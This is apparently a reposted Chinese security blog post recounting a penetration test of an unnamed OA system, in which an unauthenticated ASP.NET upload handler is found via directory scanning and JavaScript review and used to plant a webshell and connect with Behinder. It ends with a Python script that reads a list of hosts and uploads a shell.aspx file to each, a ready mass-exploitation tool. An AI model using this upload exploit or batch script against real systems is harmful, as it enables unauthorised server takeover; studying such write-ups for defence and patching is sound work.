#  记一次某OA渗透测试有意思的文件上传漏洞挖掘经历以及分析   
 黑白之道   2025-01-13 01:59  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
# 原文首发在：先知社区  
  
https://xz.aliyun.com/t/16959  
# 登陆  
  
我这边首先找到的是一个文件上传的登陆框  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmba53miaw7D93HgaibEro3WvzNeBic7C8ic6B5s56tPb7MAdUGliaxtZqQWEA/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
测试了一下sql注入之类的，发现没有  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmb0fT0a9P8LcxmGJbNXnVYR1wfPvPdTKf9uP14pAoY4TYgj609q8QCcw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
# 目录扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbW8BITPiaaXJ8LicurtfCMYGh5tM0VjGevmiboEkib1Hze3DCXIMpcPUgOQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
看到api爆出200 ok的那一刻我的心情是激动的，感觉要有很多接口泄露了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbnZnH8T4qEibJBzew9wBoHphD3lGYoOLcSyw2vORVsr6GeHSLvmDxKzA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
一堆ashx文件加上一个UEditor的组件，ashx  
  
.ashx 文件扩展名通常用于表示 ASP.NET 处理程序（ASP.NET Handler）。ASP.NET 处理程序是一种在服务器端处理特定类型请求的代码文件。这些文件通常用于执行一些特殊的服务器任务，如图像生成、文件下载或其他动态内容的处理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbsd87GeKLPqkBFpteKFmKpBoiah6hn1PibEF0emCdQGwMeQ7BhPMN54sw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
ueditor组件也有一个ashx文件，看着文件名字应该就是用来处理文件上传功能的  
  
我们访问一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbL26aOrtpPIuHyyeaia42QxiazAaib1qwsuuxtKNnvtDpLxkftG4Nf3S7g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
给我返回了这个消息，那么我们可以理解为这个文件应该是要传递一个参数的，但是参数是什么，我们目前还不知道  
  
我爆破了一下参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbibDYDuksTWib63erpc3I4gRABPZlvlkUItP0icBxkUYr3ZkS3O6sy9qNQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
依旧是接口错误  
  
难道到手的文件上传getshell（bushi就要没了吗？  
# 查看前端源码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbfib5icvloNSVDGJ9bSBhSUiaIYrVaXuerR6FHp2MImY6A8lp4NudPHTgg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
查看了一下这个js源码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbfl9xwYhS2pfaFeSiaE4OvoqyEKaYk2zmgbRcruEBasicP2dRSAbcFILA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
一搜索就搜到了我那个文件名  
  
那么就是说可以有文件删除和文件上传两个选择，传入DoWebUpload或者DoDelete参数即可  
  
那么我们选择上传一个木马文件试试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmb3aXGvszoRMoaflibqkwdrOUrnu99tsIGVypkVLeFxkYPibCg02ichmtNQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
直接就上传成功了冰蝎连接试试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbibt4owS38TAlaN4jeCjRzQKLXCnRkIblicF1PIkeUgx2RauYUfBCK8Ag/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
直接就是getshell成功了  
# 批量脚本验证  
```
import requests
import os
os.environ["http_proxy"] = "http://127.0.0.1:7890"
os.environ["https_proxy"] = "http://127.0.0.1:7890"
def poc(url=""):
# 目标URL
    url = url+'/api/FileUploadApi.ashx?method=DoWebUpload'
    files = {
        'file': ('shell.aspx', """

        """, 'image/png')
    }

    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'keep-alive'
    }
    try:
        # 发送POST请求
        response = requests.post(url, files=files, headers=headers,timeout=5)
        # 打印返回结果
        print('Response Code:', response.status_code)
        print('Response Text:', response.text)
    except Exception as e:
        print(e)
if __name__ == '__main__':
    file_path = 'url'
    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            print(line.strip())  # 使用 strip() 去掉行末的换行符
            poc("http://" + line.strip())
    # poc()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpvL1x0KKUkwseyoYGJqDmbc0EcT3aLltHGXRPclsuRtoDSGS9n0GR8rcH6wvWjGA868X5L4cbcMg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
# 小结  
  
这次感觉这个文件上传藏得还是比较深的，也是告诉自己挖掘一些漏洞的时候，千万不能放过任何一处细节，往往细节决定成败。  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
